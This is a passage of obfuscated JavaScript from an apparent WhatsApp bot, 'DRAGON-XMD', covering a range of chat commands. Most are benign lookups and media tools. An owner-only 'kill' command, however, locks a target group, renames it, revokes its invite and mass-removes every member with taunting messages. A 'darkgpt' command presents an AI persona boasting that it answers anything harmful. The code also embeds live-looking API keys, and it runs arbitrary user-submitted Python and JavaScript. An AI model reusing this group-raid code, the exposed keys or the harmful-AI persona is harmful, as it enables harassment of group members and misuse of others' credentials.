              _0x10d7a1.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝗮𝗻𝗱 𝗴𝗶𝘃𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵. 𝗜'𝗺 𝗗𝗥𝗔𝗚𝗢𝗡 𝗔𝗶, 𝗶 𝘂𝘀𝗲 𝗕𝗮𝗿𝗱 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘇𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
              return;
            }
            ;
            let _0x427931;
            if (_0x37f12c.imageMessage) {
              _0x427931 = _0x37f12c.imageMessage;
            } else {
              _0x10d7a1.reply("𝗛𝘂𝗵, 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲, 𝗦𝗲𝗻𝗱 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘁𝗵𝗲𝗻 𝘁𝗮𝗴 𝗶𝘁 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 !");
              return;
            }
            ;
            try {
              let _0x15a83e = await _0x34f9ed.downloadAndSaveMediaMessage(_0x427931);
              let _0x4238b8 = await uploadtoimgur(_0x15a83e);
              _0x10d7a1.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗟𝗲𝗺𝗺𝗲 𝗮𝗻𝗮𝗹𝘆𝘇𝗲 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲. . .");
              let _0xe8a18 = await (await fetch("https://bk9.fun/ai/geminiimg?url=" + _0x4238b8 + "&q=" + _0xe09539)).json();
              const _0x5b6147 = {
                'text': _0xe8a18.BK9
              };
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, _0x5b6147, {
                'quoted': _0x10d7a1
              });
            } catch (_0x5e31c5) {
              _0x10d7a1.reply("An error occured\n" + _0x5e31c5);
            }
          }
          break;
        case "remini":
          {
            if (!_0x1a0cc5) {
              return _0x459d18("𝗪𝗵𝗲𝗿𝗲 𝗶𝘀 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 ?");
            }
            if (!/image/.test(_0x1dbbb8)) {
              return _0x459d18("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻𝘀 " + (prefix + _0x502a51));
            }
            const {
              remini: _0x37d36d
            } = require("./lib/remini");
            let _0x4862e2 = await _0x1a0cc5.download();
            let _0x1a8198 = await _0x37d36d(_0x4862e2, "enhance");
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': _0x1a8198,
              'caption': "𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "kill2":
        case "kickall2":
        case 'terminate':
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0xe09539) {
              return _0x10d7a1.reply("Provide a valid group link. Ensure the bot is in that group with admin privileges !");
            }
            let _0x515643;
            let _0x3fe787;
            try {
              let _0x5e5c58 = _0x16f666[0x0].split("https://chat.whatsapp.com/")[0x1];
              const _0x2dea1a = await _0x34f9ed.groupGetInviteInfo(_0x5e5c58);
              ({
                id: _0x515643,
                subject: _0x3fe787
              } = _0x2dea1a);
            } catch (_0x7f4473) {
              _0x10d7a1.reply("Why are you giving me an invalid group link?");
              return;
            }
            try {
              const _0x5aa001 = await _0x34f9ed.groupMetadata(_0x515643);
              const _0x2a422b = await _0x5aa001.participants;
              let _0x12519c = _0x2a422b.filter(_0x32e946 => _0x32e946.id !== _0x34f9ed.decodeJid(_0x34f9ed.user.id)).map(_0xb8afc0 => _0xb8afc0.id);
              await _0x10d7a1.reply("☠️𝐃𝐫𝐚𝐠𝐨𝐧 𝒊𝒔 𝒊𝒏𝒊𝒕𝒊𝒂𝒍𝒊𝒛𝒊𝒏𝒈 𝒂𝒏𝒅 𝒑𝒓𝒆𝒑𝒂𝒓𝒊𝒏𝒈 𝒕𝒐 𝒌𝒊𝒍𝒍☠️ " + _0x3fe787);
              await _0x34f9ed.groupSettingUpdate(_0x515643, "announcement");
              await _0x34f9ed.removeProfilePicture(_0x515643);
              await _0x34f9ed.groupUpdateSubject(_0x515643, "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔 𝒏𝒐 𝒍𝒐𝒏𝒈𝒆𝒓 𝒂𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 🚫");
              await _0x34f9ed.groupUpdateDescription(_0x515643, "//𝑩𝒚 𝒕𝒉𝒆 𝒐𝒓𝒅𝒆𝒕 𝒐𝒇 𝗗𝗥𝗔𝗚𝗢𝗡 𝗗𝗲𝘃 !");
              await _0x34f9ed.groupRevokeInvite(_0x515643);
              await _0x34f9ed.sendMessage(_0x515643, {
                'text': "𝑨𝒕 𝒕𝒉𝒊𝒔 𝒕𝒊𝒎𝒆, 𝑴𝒚 𝒐𝒘𝒏𝒆𝒓 𝒉𝒂𝒔 𝒊𝒏𝒊𝒕𝒊𝒂𝒕𝒆𝒅 𝒕𝒐 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒓𝒆𝒎𝒐𝒕𝒆𝒍𝒚.\n𝑻𝒉𝒊𝒔 𝒉𝒂𝒔 𝒕𝒓𝒊𝒈𝒈𝒆𝒓𝒆𝒅 𝒎𝒆 𝒕𝒐 𝒓𝒆𝒎𝒐𝒗𝒆 𝒂𝒍𝒍 𝒕𝒉𝒆 𝒔𝒕𝒖𝒑𝒊𝒅 " + _0x12519c.length + " 𝒈𝒓𝒐𝒖𝒑 𝒑𝒂𝒓𝒕𝒊𝒄𝒊𝒑𝒂𝒏𝒕𝒔 𝒊𝒏 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 𝒔𝒆𝒄𝒐𝒏𝒅.\n\n𝑮𝒐𝒐𝒅 𝒃𝒚𝒆 𝑳𝒂𝒛𝒚𝒃𝒆𝒊𝒏𝒈𝒔! 👋\n\n⚠️𝑻𝑯𝑰𝑺 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑪𝑨𝑵𝑵𝑶𝑻 𝑩𝑬 𝑻𝑬𝑹𝑴𝑰𝑵𝑨𝑻𝑬𝑫⚠️",
                'mentions': _0x2a422b.map(_0x4f755c => _0x4f755c.id)
              });
              await _0x34f9ed.groupParticipantsUpdate(_0x515643, _0x12519c, 'remove');
              const _0xafa2c4 = {
                'text': "𝑮𝒐𝒐𝒅𝒃𝒚𝒆 𝑮𝒓𝒐𝒖𝒑 𝒐𝒘𝒏𝒆𝒓👋\n𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔 𝒖𝒔𝒆𝒍𝒆𝒔𝒔, 𝒄𝒓𝒆𝒂𝒕𝒆 𝒂𝒏𝒐𝒕𝒉𝒆𝒓 𝒐𝒏𝒆🥶"
              };
              await _0x34f9ed.sendMessage(_0x515643, _0xafa2c4);
              await _0x34f9ed.groupLeave(_0x515643);
              await _0x10d7a1.reply("```𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 𝑲𝒊𝒍𝒍𝒆𝒅 𝒃𝒚 𝑫𝑹𝑨𝑮𝑶𝑵-𝑿𝑴𝑫💀```");
            } catch (_0x572db6) {
              _0x10d7a1.reply("```Kill command failed, bot is either not in that group, or not an admin```.");
            }
          }
          break;
        case "carbon":
          {
            const _0x211966 = require('node-fetch');
            let _0x1e2f82 = "𝗖𝗢𝗡𝗩𝗘𝗥𝗧𝗘𝗗 𝗕𝗬 " + botname;
            if (_0x10d7a1.quoted && _0x10d7a1.quoted.text) {
              const _0x34617e = _0x10d7a1.quoted.text;
              try {
                let _0x2f0cca = await _0x211966("https://carbonara.solopov.dev/api/cook", {
                  'method': "POST",
                  'headers': {
                    'Content-Type': "application/json"
                  },
                  'body': JSON.stringify({
                    'code': _0x34617e,
                    'backgroundColor': "#1F816D"
                  })
                });
                if (!_0x2f0cca.ok) {
                  return _0x10d7a1.reply("API failed to fetch a valid response.");
                }
                let _0x287af6 = await _0x2f0cca.buffer();
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'image': _0x287af6,
                  'caption': _0x1e2f82
                }, {
                  'quoted': _0x10d7a1
                });
              } catch (_0x5a8273) {
                _0x10d7a1.reply("An error occured\n" + _0x5a8273);
              }
            } else {
              _0x10d7a1.reply("Quote a code message");
            }
          }
          break;
        case "define":
          {
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("Please provide a word.");
              }
              const _0x398c3e = encodeURIComponent(_0xe09539);
              const _0x51d87f = await fetch("https://api.dictionaryapi.dev/api/v2/entries/en/" + _0x398c3e);
              if (!_0x51d87f.ok) {
                return _0x10d7a1.reply("Failed to fetch data. Please try again later.");
              }
              const _0x27543e = await _0x51d87f.json();
              if (!_0x27543e || !_0x27543e[0x0] || !_0x27543e[0x0].meanings || _0x27543e[0x0].meanings.length === 0x0) {
                return _0x10d7a1.reply("No definitions found for the provided word.");
              }
              const _0x5af365 = _0x27543e[0x0];
              const _0x2b9540 = _0x5af365.meanings[0x0].definitions[0x0].definition;
              const _0x5e8add = '' + _0x2b9540;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': _0x5e8add
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x530433) {
              console.error("Error occurred:", _0x530433);
              _0x10d7a1.reply("An error occurred while fetching the data. Please try again later.\n" + _0x530433);
            }
          }
          break;
        case 'tweet':
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("provide some text for the tweet");
            }
            const _0x198d71 = _0x10d7a1.sender.split('@')[0x0];
            const _0x59b8b4 = await _0x34f9ed.profilePictureUrl(_0x10d7a1.sender, "image")["catch"](_0x59c883 => "https://i.imgur.com/BsF7NhZ.jpeg");
            const _0x4da4ec = 'https://some-random-api.com/canvas/misc/tweet?displayname=' + encodeURIComponent(_0x1b6245) + '&username=' + encodeURIComponent(_0x198d71) + "&avatar=" + encodeURIComponent(_0x59b8b4) + "&comment=" + encodeURIComponent(_0xe09539) + "&replies=" + encodeURIComponent("246") + "&retweets=" + encodeURIComponent("125") + "&theme=" + encodeURIComponent('dark');
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': {
                'url': _0x4da4ec
              },
              'caption': "𝗖𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗱 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "pickupline":
          {
            try {
              const _0x393b61 = await fetch('https://api.popcat.xyz/pickuplines');
              if (!_0x393b61.ok) {
                throw new Error("Failed to fetch data");
              }
              const {
                pickupline: _0x4fddc2
              } = await _0x393b61.json();
              const _0x2f3bfa = '' + _0x4fddc2;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': _0x2f3bfa
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x1a49ab) {
              console.error("Error fetching data:", _0x1a49ab);
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': "An error occurred while fetching the fact."
              }, {
                'quoted': _0x10d7a1
              });
            }
          }
          break;
        case "quotes":
          {
            try {
              const _0x5762f2 = await fetch("https://favqs.com/api/qotd");
              if (!_0x5762f2.ok) {
                throw new Error("Failed to fetch data");
              }
              const {
                quote: _0x3d650d
              } = await _0x5762f2.json();
              const _0x46b8a4 = _0x3d650d.body + " \n\n𝗤𝘂𝗼𝘁𝗲 𝗕𝘆 " + _0x3d650d.author;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': _0x46b8a4
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x4e8516) {
              console.error("Error fetching data:", _0x4e8516);
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': "An error occurred while fetching the fact."
              }, {
                'quoted': _0x10d7a1
              });
            }
          }
          break;
        case "google":
          {
            const _0xd3839 = require("axios");
            if (!_0xe09539) {
              _0x10d7a1.reply("Provide a search term!\nEg: .Google What is treason");
              return;
            }
            let {
              data: _0x35385f
            } = await _0xd3839.get("https://www.googleapis.com/customsearch/v1?q=" + _0xe09539 + '&key=AIzaSyDMbI3nvmQUrfjoCJYLS69Lej1hSXQjnWI&cx=baf9bdb0c631236e5');
            if (_0x35385f.items.length == 0x0) {
              _0x10d7a1.reply("❌ Unable to find a result");
              return;
            }
            let _0x2d5687 = "SEARCH FROM GOOGLE\n🔍 Term:- " + _0xe09539 + "\n\n";
            for (let _0x254b5c = 0x0; _0x254b5c < _0x35385f.items.length; _0x254b5c++) {
              _0x2d5687 += "🪧 Title:- " + _0x35385f.items[_0x254b5c].title + "\n🖥 Description:- " + _0x35385f.items[_0x254b5c].snippet + "\n🌐 Link:- " + _0x35385f.items[_0x254b5c].link + "\n\n";
            }
            _0x10d7a1.reply(_0x2d5687);
          }
          break;
        case "hack":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            try {
              const _0x255fca = ["⚠️𝗜𝗻𝗶𝘁𝗶𝗹𝗶𝗮𝘇𝗶𝗻𝗴 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗧𝗼𝗼𝗹𝘀⚠️", "𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗻𝗴 𝗠𝗮𝗹𝘄𝗮𝗿𝗲🐛..\n𝗟𝗼𝗮𝗱𝗶𝗻𝗴 𝗗𝗲𝘃𝗶𝗰𝗲 𝗚𝗮𝗹𝗹𝗲𝗿𝘆 𝗙𝗶𝗹𝗲𝘀⚠️", "```██ 10%``` ⏳", "```████ 20%``` ⏳", "```██████ 30%``` ⏳", "```████████ 40%``` ⏳", "```██████████ 50%``` ⏳", "```████████████ 60%``` ⏳", "```██████████████ 70%``` ⏳", "```████████████████ 80%``` ⏳", "```██████████████████ 90%``` ⏳", "```████████████████████ 100%``` ✅", "```𝗦𝘆𝘀𝘁𝗲𝗺 𝗛𝘆𝗷𝗮𝗰𝗸𝗶𝗻𝗴 𝗼𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...```\n```𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘁𝗵𝗲 𝗦𝗲𝗿𝘃𝗲𝗿 𝘁𝗼 𝗙𝗶𝗻𝗱 𝗘𝗿𝗿𝗼𝗿 404```", "```𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝘁𝗼 𝗗𝗲𝘃𝗶𝗰𝗲...\n𝗥𝗲𝗰𝗲𝗶𝘃𝗶𝗻𝗴 𝗗𝗮𝘁𝗮/𝗦𝗲𝗰𝗿𝗲𝘁 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀...```", "```𝗗𝗮𝘁𝗮 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗲𝗱 𝗙𝗿𝗼𝗺 𝗱𝗲𝘃𝗶𝗰𝗲 100% 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱\n𝗘𝗿𝗮𝘀𝗶𝗻𝗴 𝗮𝗹𝗹 𝗘𝘃𝗶𝗱𝗲𝗻𝗰𝗲, 𝗞𝗶𝗹𝗹𝗶𝗻𝗴 𝗮𝗹𝗹 𝗠𝗮𝗹𝘄𝗮𝗿𝗲𝘀🐛...```", "```𝗦𝗘𝗡𝗗𝗜𝗡𝗗 𝗟𝗢𝗚 𝗗𝗢𝗖𝗨𝗠𝗘𝗡𝗧𝗦...```", "```𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗗𝗮𝘁𝗮 𝗔𝗻𝗱 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗗𝗶𝘀𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱```", "```𝗔𝗹𝗹 𝗕𝗮𝗰𝗸𝗹𝗼𝗴𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆💣\n𝗬𝗼𝘂𝗿 𝗦𝘆𝘀𝘁𝗲𝗺 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗗𝗼𝘄𝗻 𝗜𝗻 𝗧𝗵𝗲 𝗡𝗲𝘅𝘁 𝗠𝗶𝗻𝘂𝘁𝗲⚠️```"];
              for (const _0x231a9a of _0x255fca) {
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'text': _0x231a9a
                }, {
                  'quoted': _0x10d7a1
                });
                await new Promise(_0x4f008c => setTimeout(_0x4f008c, 0x3e8));
              }
            } catch (_0x1654a2) {
              console.error("Error during prank:", _0x1654a2);
              _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'text': "❌ *Error!* Something went wrong. Reason: " + _0x1654a2.message + ". Please try again later."
              });
            }
          }
          break;
        case 'compile-py':
          if (!_0xe09539 && !_0x10d7a1.quoted) {
            throw "Quote/tag a python code to compile.";
          }
          const _0x231cf7 = _0x10d7a1.quoted ? _0x10d7a1.quoted.text ? _0x10d7a1.quoted.text : _0xe09539 ? _0xe09539 : _0x10d7a1.text : _0x10d7a1.text;
          let _0x578395 = python.runSource(_0x231cf7);
          _0x578395.then(_0x12ea30 => {
            console.log(_0x12ea30);
            _0x459d18(_0x12ea30.stdout);
            _0x459d18(_0x12ea30.stderr);
          })["catch"](_0x3abf61 => {
            console.log(resultt.stderr);
            _0x459d18(resultt.stderr);
          });
          break;
        case "save":
          {
            const _0x3d3166 = _0x10d7a1.text.toLowerCase();
            const _0x23d9f2 = _0x10d7a1.msg?.["contextInfo"]?.["quotedMessage"];
            if (_0x23d9f2 && _0x3d3166.startsWith(prefix + 'save') && !_0x10d7a1.quoted.chat.includes('status@broadcast')) {
              return _0x10d7a1.reply("You did not tag a status media to save.");
            }
            if (_0x22f9f0 && _0x23d9f2 && _0x3d3166.startsWith(prefix + "save") && _0x10d7a1.quoted.chat.includes("status@broadcast")) {
              if (_0x23d9f2.imageMessage) {
                let _0x548861 = _0x23d9f2.imageMessage.caption;
                let _0x1cb96e = await _0x34f9ed.downloadAndSaveMediaMessage(_0x23d9f2.imageMessage);
                _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'image': {
                    'url': _0x1cb96e
                  },
                  'caption': _0x548861
                });
              }
              if (_0x23d9f2.videoMessage) {
                let _0x2c44f8 = _0x23d9f2.videoMessage.caption;
                let _0x13ea93 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x23d9f2.videoMessage);
                _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'video': {
                    'url': _0x13ea93
                  },
                  'caption': _0x2c44f8
                });
              }
            }
          }
          break;
        case 'gitclone':
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("Where is the link?");
            }
            if (!_0xe09539.includes("github.com")) {
              return _0x10d7a1.reply("Is that a GitHub repo link ?!");
            }
            let _0x3f2c97 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
            let [, _0x5810b5, _0x344b71] = _0xe09539.match(_0x3f2c97) || [];
            _0x344b71 = _0x344b71.replace(/.git$/, '');
            let _0x3e664f = 'https://api.github.com/repos/' + _0x5810b5 + '/' + _0x344b71 + '/zipball';
            let _0x4cdb66 = (await fetch(_0x3e664f, {
              'method': "HEAD"
            })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[0x1];
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'document': {
                'url': _0x3e664f
              },
              'fileName': _0x4cdb66 + ".zip",
              'mimetype': "application/zip"
            }, {
              'quoted': _0x10d7a1
            })["catch"](_0x18afb7 => _0x10d7a1.reply("error"));
          }
          break;
        case "darkgpt":
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("Hey there Fuckface😈, I'm Darkgpt, I respond to anything be it harmful, I'm a pure Evil👿, What sort of dark and delightful nonsense do you want to dive into Today😈 ?");
            }
            try {
              const _0x64efb = await fetchJson("https://api.dreaded.site/api/makgpt?text=" + _0xe09539);
              if (_0x64efb && _0x64efb.result) {
                const _0x4ac563 = _0x64efb.result;
                await _0x10d7a1.reply(_0x4ac563);
              } else {
                _0x10d7a1.reply("Huh, the silence is deafening, no response whatsoever💀.The API seems to have vanished into the abyss...😔");
              }
            } catch (_0x59e08c) {
              _0x459d18("An error occured while communicating with the APIs\n" + _0x59e08c);
            }
          }
          break;
        case 'github':
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("Provide a github username to stalk");
            }
            try {
              const _0x40d1f5 = await fetch('https://itzpire.com/stalk/github-user?username=' + _0xe09539);
              const _0x5c0b70 = await _0x40d1f5.json();
              const _0x11ea60 = _0x5c0b70.data.username;
              const _0x3f2751 = _0x5c0b70.data.nickname;
              const _0x2505ee = _0x5c0b70.data.bio;
              const _0x445116 = _0x5c0b70.data.profile_pic;
              const _0x15c218 = _0x5c0b70.data.url;
              const _0x3fabb1 = _0x5c0b70.data.location;
              const _0x3c2470 = _0x5c0b70.data.public_repo;
              const _0x29136d = _0x5c0b70.data.followers;
              const _0x458829 = _0x5c0b70.data.following;
              const _0x1df748 = _0x5c0b70.data.ceated_at;
              const _0x113c99 = "Username:- " + _0x11ea60 + "\n\nNickname:- " + _0x3f2751 + "\n\nBio:- " + _0x2505ee + "\n\nLink:- " + _0x15c218 + "\n\nLocation:- " + _0x3fabb1 + "\n\nFollowers:- " + _0x29136d + "\n\nFollowing:- " + _0x458829 + "\n\nRepos:- " + _0x3c2470 + "\n\nCreated:- " + _0x1df748;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x445116
                },
                'caption': _0x113c99
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0xf7a32a) {
              _0x10d7a1.reply("Unable to fetch data\n" + _0xf7a32a);
            }
          }
          break;
        case "screenshot":
        case 'ss':
          {
            try {
              let _0x933c5b = "𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝘆 " + botname;
              if (!_0xe09539) {
                return _0x10d7a1.reply("Provide a website link to screenshot.");
              }
              const _0x53efdb = 'https://image.thum.io/get/fullpage/' + _0xe09539;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x53efdb
                },
                'caption': _0x933c5b
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x2a54f9) {
              _0x10d7a1.reply("An error occured.");
            }
          }
          break;
        case "alive":
        case "test":
          {
            const _0x76bab6 = {
              'audio': {
                'url': './Media/alive.mp3'
              },
              'mimetype': "audio/mp4",
              'ptt': true,
              'waveform': [0x64, 0x0, 0x64, 0x0, 0x64, 0x0, 0x64],
              'fileName': "𝗗𝗿𝗮𝗴𝗼𝗻",
              'contextInfo': {
                'mentionedJid': [_0x10d7a1.sender],
                'externalAdReply': {
                  'title': "𝗛𝗶 𝗯𝗿𝗲𝘁𝗵𝗿𝗲𝗻👋, 𝗜 𝗮𝗺 𝗔𝗹𝗶𝘃𝗲 𝗮𝗻𝗱 𝗴𝘂𝗮𝗿𝗱𝗲𝗱 𝗯𝘆 𝗚𝗢𝗗'𝗦 𝗴𝗹𝗼𝗿𝘆😂",
                  'body': "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                  'thumbnailUrl': "https://i.imgur.com/A08nrWx.jpeg",
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            };
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, _0x76bab6, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case 'removebg':
          {
            try {
              if (!_0x10d7a1.quoted) {
                return _0x10d7a1.reply("Send the image then tag it with the command.");
              }
              if (!/image/.test(_0x1dbbb8)) {
                return _0x10d7a1.reply("That is not an image, try again while quoting an actual image.");
              }
              let _0x3ad13f = await _0x34f9ed.downloadAndSaveMediaMessage(_0x10d7a1.quoted);
              let _0x4f4282 = await uploadtoimgur(_0x3ad13f);
              _0x10d7a1.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗗𝗿𝗮𝗴𝗼𝗻 𝗶𝘀 𝗲𝗿𝗮𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝗮𝗰𝗸𝗴𝗿𝗼𝘂𝗻𝗱. . .");
              const _0x3541a3 = "https://api.dreaded.site/api/removebg?imageurl=" + _0x4f4282;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x3541a3
                },
                'caption': "𝗘𝗱𝗶𝘁𝗲𝗱 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x14a1af) {
              _0x10d7a1.reply("An error occured...");
            }
          }
          break;
        case "fact":
          {
            try {
              const _0x219fc3 = await fetchJson("https://api.dreaded.site/api/fact");
              const _0x32c823 = _0x219fc3.fact;
              await _0x10d7a1.reply(_0x32c823);
            } catch (_0x4c7259) {
              _0x10d7a1.reply("Something is wrong.");
            }
          }
          break;
        case "catfact":
          {
            try {
              const _0x16a329 = await fetchJson("https://api.dreaded.site/api/catfact");
              const _0x28f291 = _0x16a329.fact;
              await _0x10d7a1.reply(_0x28f291);
            } catch (_0x2de5e1) {
              _0x10d7a1.reply("Something is wrong.");
            }
          }
          break;
        case "tts":
        case "say":
          {
            const _0x168492 = require("google-tts-api");
            if (!_0xe09539) {
              return _0x10d7a1.reply("Povide a text for conversion !");
            }
            const _0x5422bd = _0x168492.getAudioUrl(_0xe09539, {
              'lang': 'hi-IN',
              'slow': false,
              'host': "https://translate.google.com"
            });
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'audio': {
                'url': _0x5422bd
              },
              'mimetype': 'audio/mp4',
              'ptt': true
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case 'gpt':
          {
            if (!_0xe09539) {
              return _0x459d18("Hello there, what's your question?");
            }
            let _0x19bc74 = await fetchJson("https://bk9.fun/ai/jeeves-chat2?q=" + _0xe09539);
            if (!_0x19bc74.BK9) {
              return _0x459d18("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x459d18(_0x19bc74.BK9);
            }
          }
          break;
        case "weather":
          {
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("provide a city/town name");
              }
              const _0x23a994 = await fetch("http://api.openweathermap.org/data/2.5/weather?q=" + _0xe09539 + '&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785');
              const _0x19f839 = await _0x23a994.json();
              console.log("Weather data:", _0x19f839);
              const _0x1b2a82 = _0x19f839.name;
              const _0x359e71 = _0x19f839.main.temp;
              const _0x2f6ed9 = _0x19f839.weather[0x0].description;
              const _0x31129b = _0x19f839.main.humidity;
              const _0x1b2c01 = _0x19f839.wind.speed;
              const _0x458e91 = _0x19f839.rain ? _0x19f839.rain['1h'] : 0x0;
              const _0xd36902 = _0x19f839.clouds.all;
              const _0x59bfac = new Date(_0x19f839.sys.sunrise * 0x3e8);
              const _0xf696f8 = new Date(_0x19f839.sys.sunset * 0x3e8);
              await _0x10d7a1.reply("❄️ Weather in " + _0x1b2a82 + "\n\n🌡️ Temperature: " + _0x359e71 + "°C\n📝 Description: " + _0x2f6ed9 + "\n❄️ Humidity: " + _0x31129b + "%\n🌀 Wind Speed: " + _0x1b2c01 + " m/s\n🌧️ Rain Volume (last hour): " + _0x458e91 + " mm\n☁️ Cloudiness: " + _0xd36902 + "%\n🌄 Sunrise: " + _0x59bfac.toLocaleTimeString() + "\n🌅 Sunset: " + _0xf696f8.toLocaleTimeString());
            } catch (_0x350219) {
              _0x10d7a1.reply("Unable to find that location.");
            }
          }
          break;
        case "compile-js":
          if (!_0xe09539 && !_0x10d7a1.quoted) {
            throw "Quote/tag a Js code to compile.";
          }
          const _0x1522a6 = _0x10d7a1.quoted ? _0x10d7a1.quoted.text ? _0x10d7a1.quoted.text : _0xe09539 ? _0xe09539 : _0x10d7a1.text : _0x10d7a1.text;
          let _0x4e57ea = node.runSource(_0x1522a6);
          _0x4e57ea.then(_0xc5c4dc => {
            console.log(_0xc5c4dc);
            _0x459d18(_0xc5c4dc.stdout);
            _0x459d18(_0xc5c4dc.stderr);
          })['catch'](_0x1231c6 => {
            console.log(resultt1.stderr);
            _0x459d18(resultt1.stderr);
          });
          break;
        case "quotely":
          {
            try {
              if (!_0x10d7a1.quoted.text) {
                throw "qoute a text";
              }
              let _0x3d615b = _0x10d7a1.quoted.text;
              const {
                quote: _0x2461c8
              } = require('./lib/dragonquotely.js');
              let _0x326b4c = await _0x34f9ed.profilePictureUrl(_0x10d7a1.sender, 'image')["catch"](_0x1f9664 => "https://telegra.ph/file/75272825615a4dcb69526.png");
              const _0xbc109e = await _0x2461c8(_0x3d615b, _0x1b6245, _0x326b4c);
              _0x34f9ed.sendImageAsSticker(_0x10d7a1.chat, _0xbc109e.result, _0x10d7a1, {
